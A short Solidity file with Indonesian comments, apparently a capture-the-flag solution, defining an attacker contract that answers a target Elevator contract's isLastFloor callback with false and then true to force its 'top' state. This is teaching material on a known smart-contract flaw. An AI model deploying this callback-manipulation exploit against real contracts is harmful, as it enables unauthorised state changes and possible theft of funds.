// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Kita mendefinisikan ulang Interface agar sesuai dengan target
interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    // Variabel untuk menyimpan target
    IElevator public target;
    
    // Variabel saklar (Switch)
    bool public toggle = true;

    constructor(address _targetAddress) {
        target = IElevator(_targetAddress);
    }

    // Fungsi ini yang akan dipanggil oleh Elevator
    // Kita buat dia "Bipolar" (Plin-plan)
    function isLastFloor(uint256) external returns (bool) {
        if (toggle) {
            // Panggilan Pertama:
            toggle = false; // Ubah status untuk panggilan berikutnya
            return false;   // Jawab FALSE agar masuk ke blok 'if' di Elevator
        } else {
            // Panggilan Kedua:
            toggle = true;  // Reset (opsional)
            return true;    // Jawab TRUE agar 'top' menjadi true
        }
    }

    // Fungsi untuk memulai serangan
    function attack() public {
        // Kita panggil goTo ke lantai berapapun (misal lantai 10)
        // Saat goTo berjalan, Elevator akan menelepon balik ke 'isLastFloor' kita
        target.goTo(10);
    }
}